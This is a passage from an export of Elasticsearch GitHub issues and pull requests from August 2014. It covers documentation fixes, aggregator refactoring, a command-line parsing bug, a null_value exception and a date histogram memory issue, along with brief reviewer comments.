</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update snapshots.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7286</link><project id="" key="" /><description>Added a link so you directly get to the page that tells how to open/close an index.
Link should go here https://github.com/elasticsearch/elasticsearch/blob/1.x/docs/reference/indices/open-close.asciidoc
</description><key id="40272724">7286</key><summary>Update snapshots.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">cebe</reporter><labels><label>docs</label></labels><created>2014-08-14T16:29:47Z</created><updated>2014-08-18T11:04:49Z</updated><resolved>2014-08-18T11:04:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Made it possible to disable the main transport handler in TransportShardSingleOperationAction</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7285</link><project id="" key="" /><description>`TransportShardSingleOperationAction` is currently subclassed by different transport actions. Some of them are internal only, meaning that their execution will take place only in the same node where their parent execution took place. That means that their main transport handler doesn't need to be registered, the only transport handler that's needed is the shard level one. 

Added abstract method `isSubAction` to the parent class that tells whether the action is a main one or a subaction, used to decide whether we need to register the main transport handler.
</description><key id="40263019">7285</key><summary>Made it possible to disable the main transport handler in TransportShardSingleOperationAction</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-14T15:03:41Z</created><updated>2015-06-07T12:23:33Z</updated><resolved>2014-08-19T15:04:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-08-19T14:16:56Z" id="52640429">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Made TransportService's adapter extensible</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7284</link><project id="" key="" /><description /><key id="40259434">7284</key><summary>Made TransportService's adapter extensible</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels /><created>2014-08-14T14:30:17Z</created><updated>2014-08-14T21:03:42Z</updated><resolved>2014-08-14T21:03:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-08-14T14:56:08Z" id="52193930">Left a couple of comments, I'd also write a small test that uses this new extension point, so at least something fails if we remove it by accident one day :)
</comment><comment author="uboness" created="2014-08-14T16:27:37Z" id="52206821">updated based on feedback from @javanna
</comment><comment author="uboness" created="2014-08-14T21:03:42Z" id="52244134">closing.. after some thought, extending the adapter feels a bit wrong
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update prefix-query.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7283</link><project id="" key="" /><description>Typo (missing word)
</description><key id="40256789">7283</key><summary>Update prefix-query.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">DarthGregarious</reporter><labels><label>docs</label></labels><created>2014-08-14T14:02:20Z</created><updated>2014-09-07T09:32:35Z</updated><resolved>2014-09-07T09:32:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-07T09:31:29Z" id="54741939">CLA not signed - treating as bug report.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Parsing command line args multiple times throws `AlreadySelectedException`</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7282</link><project id="" key="" /><description>This issue has been fixed in commons-cli:1.3 project which sadly has not been released yet.
See https://issues.apache.org/jira/browse/CLI-183

This patch builds another list of options with no selected groups by default.

When commons-cli:1.3 will be released, we need to remove this patch.
</description><key id="40253440">7282</key><summary>Parsing command line args multiple times throws `AlreadySelectedException`</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:Packaging</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-14T13:24:36Z</created><updated>2015-06-07T19:08:58Z</updated><resolved>2014-08-19T09:04:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-08-18T07:23:33Z" id="52459497">should we add a test or did your normal implementation fail with this?
</comment><comment author="dadoonet" created="2014-08-18T10:59:41Z" id="52477986">@spinscale I can do it although there will be a new PR in few days with a test which actually discovers that issue. Should I add another test for the current PR?
</comment><comment author="uboness" created="2014-08-18T13:07:24Z" id="52489018">yeah... please add small dedicated test that checks it 
</comment><comment author="dadoonet" created="2014-08-18T13:26:43Z" id="52491155">@spinscale @uboness Added a test which fails without the patch and passes after patch being applied.
</comment><comment author="dadoonet" created="2014-08-18T14:10:15Z" id="52496959">@spinscale I just added a test for `--help` to make sure that it does not fail. Let me know.
</comment><comment author="uboness" created="2014-08-18T23:06:14Z" id="52567879">@dadoonet while it's ok to add the test for `help` it doesn't really do much... cause if it fails on normal options (not just on groups), the current implement wouldn't have worked anyway, cause you're copying all the options as they are from the current options... the destiny of the `help` option is the same destiny of any other option you copy
</comment><comment author="dadoonet" created="2014-08-19T06:18:06Z" id="52594529">@uboness agreed. 

Any other comment? Does it look good to you guys?
</comment><comment author="spinscale" created="2014-08-19T08:04:04Z" id="52602056">LGTM, like the comment about the release of commons-cli 1.3, as the last release was five years ago :-)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Adds missing explanation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7281</link><project id="" key="" /><description>The documentation is confusing as it is written.
</description><key id="40251572">7281</key><summary>Adds missing explanation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">DarthGregarious</reporter><labels><label>docs</label></labels><created>2014-08-14T13:03:33Z</created><updated>2014-09-07T09:31:17Z</updated><resolved>2014-09-07T09:31:17Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-18T11:03:36Z" id="52478264">Hi @DarthGregarious 

Thanks for the PR.  Please could I ask you to sign the CLA so that I can get this merged in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="clintongormley" created="2014-09-07T09:29:59Z" id="54741903">CLA not signed, treating as bug report.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Docs: Document distance type and sort mode for many to many geo_points</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7280</link><project id="" key="" /><description /><key id="40251338">7280</key><summary>Docs: Document distance type and sort mode for many to many geo_points</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels /><created>2014-08-14T13:00:27Z</created><updated>2014-08-18T14:17:22Z</updated><resolved>2014-08-18T14:17:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-18T07:28:41Z" id="52459834">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Merge LongTermsAggregator and DoubleTermsAggregator.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7279</link><project id="" key="" /><description>These two aggregators basically do exactly the same thing, they just interpret
bytes differently. This refactoring found an (unreleased) bug in the long terms
aggregator which didn't work correctly with duplicate values.
</description><key id="40250240">7279</key><summary>Merge LongTermsAggregator and DoubleTermsAggregator.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Aggregations</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-14T12:45:55Z</created><updated>2015-06-07T12:23:47Z</updated><resolved>2014-08-19T13:35:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-19T11:00:24Z" id="52618127">I like the removal of duplicated logic! LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add an option to write the aggregation type in the response</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7278</link><project id="" key="" /><description>This pull requests add two optional parameters to the aggregations toXContent, one to write the TYPE of the aggregation and the other to write the classname of the aggregation.

The type field exists for facets but not for aggregations. I believe these informations can be usefull to create mappers without having to either rely on the request or infering the type from the response.

Existing client will not be impacted because the new informations are optional, but they may start to use it.

Suggestions for the fields and parameters names are welcome.
Maybe writing class.getSimpleName() is more robust than class.getName() in regard of refactorings.

It would be wonderful if this could also be merged with branch 1.x.

ouput would be like : 

``` json
{  
   "_type":"terms",
   "_concrete_type":"org.elasticsearch.search.aggregations.bucket.terms.StringTerms",
   "doc_count_error_upper_bound":0,
   "buckets":[  
      {  
         "key":"val0",
         "doc_count":1
      }
   ]
}
```
</description><key id="40245311">7278</key><summary>Add an option to write the aggregation type in the response</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">obourgain</reporter><labels /><created>2014-08-14T11:27:17Z</created><updated>2014-08-14T11:45:02Z</updated><resolved>2014-08-14T11:45:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-14T11:45:02Z" id="52173387">@obourgain We discussed this issue in https://github.com/elasticsearch/elasticsearch/issues/5867 which lead to https://github.com/elasticsearch/elasticsearch/pull/6465, which would add the ability to add arbitrary metadata to aggregations and have it back in the responses. It looks like the PR is a bit stalled however.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove the 'Factor' paragraph to reflect #6490</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7277</link><project id="" key="" /><description>The current implementation of 'date_histogram' does not understand
the `factor` parameter. Since the docs shouldn't raise false hopes,
I removed the section.

SN: I wonder, wether the parameter was intentionally left out
in anticipation of #6599 ?
</description><key id="40241337">7277</key><summary>Remove the 'Factor' paragraph to reflect #6490</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">konradkonrad</reporter><labels><label>docs</label></labels><created>2014-08-14T10:24:28Z</created><updated>2014-08-18T11:14:22Z</updated><resolved>2014-08-18T11:03:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Remove the logic to optionally sort/dedup values on the fly.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7276</link><project id="" key="" /><description>These options are not used anymore. Instead numeric values can now contain dups
and it is the responsibility of the aggregation to deal with it (eg. terms).
And otherwise all values sources are now sorted, which is the contract of the
interfaces that they implement.
</description><key id="40241033">7276</key><summary>Remove the logic to optionally sort/dedup values on the fly.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Aggregations</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-14T10:20:16Z</created><updated>2015-06-07T12:23:59Z</updated><resolved>2014-08-21T08:34:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-21T08:13:00Z" id="52890808">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make the list of buckets for terms and histogram returned as a java.util.List.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7275</link><project id="" key="" /><description>The terms and histogram aggregations always have an order. So it would make the
response easier to consume to return the buckets as a list instead of a
collection in order to make it easier to do things like getting the first/last
buckets.
</description><key id="40240459">7275</key><summary>Make the list of buckets for terms and histogram returned as a java.util.List.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Aggregations</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-14T10:11:47Z</created><updated>2015-06-07T12:24:08Z</updated><resolved>2014-08-18T07:36:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-08-18T07:19:42Z" id="52459235">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>documentation missing filter be more explicit</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7274</link><project id="" key="" /><description>Hey,

it would be awesome if the documentation about the missing filter would be more accurate/specific/explicit according to the null_value that the field it self needs the null_value defined to to be mapped.

It took my quite some time to figure it out.
</description><key id="40240441">7274</key><summary>documentation missing filter be more explicit</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">julianhille</reporter><labels><label>docs</label></labels><created>2014-08-14T10:11:36Z</created><updated>2014-11-08T16:01:59Z</updated><resolved>2014-11-08T16:01:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>NPE in  case of null_value creation with value as null</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7273</link><project id="" key="" /><description>Hey,

as we tried to understand the missing filter
we came across a null pointer exception in creating a default null_value in the mapping.

The NPE is thrown if we try to set the "null_value" to null.

```
PUT /foo
{
  "mappings": {
    "bar": {
      "properties": {
        "exception": {
          "null_value": null,
          "type": "integer"
        }
      }
    }
  }
}
```
</description><key id="40240209">7273</key><summary>NPE in  case of null_value creation with value as null</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/polyfractal/following{/other_user}', u'events_url': u'https://api.github.com/users/polyfractal/events{/privacy}', u'organizations_url': u'https://api.github.com/users/polyfractal/orgs', u'url': u'https://api.github.com/users/polyfractal', u'gists_url': u'https://api.github.com/users/polyfractal/gists{/gist_id}', u'html_url': u'https://github.com/polyfractal', u'subscriptions_url': u'https://api.github.com/users/polyfractal/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/1224228?v=4', u'repos_url': u'https://api.github.com/users/polyfractal/repos', u'received_events_url': u'https://api.github.com/users/polyfractal/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/polyfractal/starred{/owner}{/repo}', u'site_admin': False, u'login': u'polyfractal', u'type': u'User', u'id': 1224228, u'followers_url': u'https://api.github.com/users/polyfractal/followers'}</assignee><reporter username="">julianhille</reporter><labels><label>bug</label><label>low hanging fruit</label><label>v1.3.5</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-08-14T10:08:36Z</created><updated>2014-10-10T20:30:04Z</updated><resolved>2014-10-10T20:30:04Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="cfontes" created="2014-08-22T06:33:28Z" id="53027787">I can try.

Is there anything else that can be provided? A ErrorStack maybe?

Cheers.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Improved error handling in geo_distance</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7272</link><project id="" key="" /><description>geo_distance filter now throws a parse exception if no distance parameter is supplied

Close #7260
</description><key id="40236953">7272</key><summary>Improved error handling in geo_distance</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Geo</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-14T09:22:03Z</created><updated>2015-06-07T19:09:06Z</updated><resolved>2014-08-14T09:35:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-14T09:22:52Z" id="52161847">LGTM
</comment><comment author="colings86" created="2014-08-14T09:35:29Z" id="52162980">push to master and 1.x
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Added support for empty field arrays in mappings</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7271</link><project id="" key="" /><description>Fix for #6133, added the ability to send empty arrays as part of an index mapping json. For single and multi field properties objects

Sorry for the import changes, IntelliJ doesn't like eclipse imports and fights it like the devil.

If the test are in a non standard format please advise. I just find them easier to read like this.
</description><key id="40233723">7271</key><summary>Added support for empty field arrays in mappings</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">cfontes</reporter><labels><label>:REST</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-14T08:39:47Z</created><updated>2015-06-07T19:09:18Z</updated><resolved>2014-08-27T08:20:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-26T09:07:59Z" id="53393896">@cfontes I left two comments on the PR but otherwise it looks good, especially the tests.

I would be nice to fix these imports. I'm quite surprised that you mention that you use Intellij since I thought we were using Intellij's defaults (we even have an eclipse configuration to make sure we are using Intellij's import style). Or maybe you have a non-default configuration of imports in Intellij?

Could you please also sign [our contributor license agreement](http://www.elasticsearch.org/contributor-agreement/) so that we can eventually merge this pull request?

Thanks!
</comment><comment author="jpountz" created="2014-08-26T09:25:40Z" id="53395640">&gt; Could you please also sign our contributor license agreement so that we can eventually merge this pull request?

I just learned that it is in, so it is allright for the CLA.
</comment><comment author="cfontes" created="2014-08-27T00:53:04Z" id="53513904">Thanks for the review.

I will look into fixing those and push it asap.

About the imports, you are right... it's my bad, one of my other projects have a very specific rule for imports and it got into my ES project by mistake. Will fix that too.

Cheers!
</comment><comment author="cfontes" created="2014-08-27T06:48:38Z" id="53532641">@jpountz

Added back the IntelliJ default import settings.
Added some code to validate the scenarios explained.
Added some tests to validate those.

Since there is nothing really to do in `parseProperties` when the parameter is an empty List it just skip the parsing and proceed without any exception since now it's a valid input that does nothing. If it's anything else (besides a map) it throws an exception. Please take a look to see if it's OK like that for you.

Thanks!
</comment><comment author="jpountz" created="2014-08-27T08:20:51Z" id="53539716">Merged, thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>(pre_zone_adjust_large_interval = true) AND (min_doc_count = 0) -&gt; OutOfMemory</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7270</link><project id="" key="" /><description>Using a dateHistogram query with `pre_zone` adjustment together with `pre_zone_adjust_large_interval = true` and `min_doc_count = 0` leads to an infinite loop and consequently OutOfMemory error.

We have observed this in v1.0.2 and verified that the same issue is still in v1.3.1.

To verify this, we used the `DateHistogramTests` test case `singleValue_WithPreZone_WithAadjustLargeInterval` and added the line `.minDocCount(0L)` to the `dateHistogram` builder.

The issue seems to be in `InternalHistogram.reduce(ReduceContext)` in the `if (minDocCount == 0) {` branch. For the previous test case, the line `while (key != nextBucket.key) {` loops endlessly because the zone adjustments seem not to be taken into account.

We have seen similar things with post_zone (unfortunately, I could not reproduce it with a test case).
</description><key id="40233563">7270</key><summary>(pre_zone_adjust_large_interval = true) AND (min_doc_count = 0) -&gt; OutOfMemory</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">ywelsch-t</reporter><labels><label>bug</label><label>feedback_needed</label></labels><created>2014-08-14T08:37:39Z</created><updated>2014-08-14T09:04:23Z</updated><resolved>2014-08-14T09:04:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-14T08:48:43Z" id="52158126">Hi @ywelsch-t 

This looks like it is a duplicate of #7022, which was fixed in the 1.3.2 release yesterday.  Could you try out 1.3.2 and confirm that it fixes the issue for you?
</comment><comment author="ywelsch-t" created="2014-08-14T09:04:11Z" id="52159706">v.1.3.2 fixes the issue :+1: 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Introduced a new elasticsearch exception family that can hold headers</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7269</link><project id="" key="" /><description>- These headers will be copied as response header on the rest response
